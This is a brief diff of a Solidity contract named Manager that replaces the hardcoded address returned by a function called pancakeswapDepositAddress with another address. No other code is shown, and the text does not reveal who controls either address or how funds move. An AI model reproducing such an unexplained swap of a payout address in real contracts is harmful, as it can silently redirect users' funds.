@@ -7,6 +7,6 @@ contract Manager {
     }
     
     function pancakeswapDepositAddress() public pure returns (address) {
-        return 0xB9A62f595CB7fAf24630a262cc1b2E4B6E64F038;
+        return 0xDE45875863b4c8Cfc7626350c9c09BBA5CA690Eb;
     }
 }
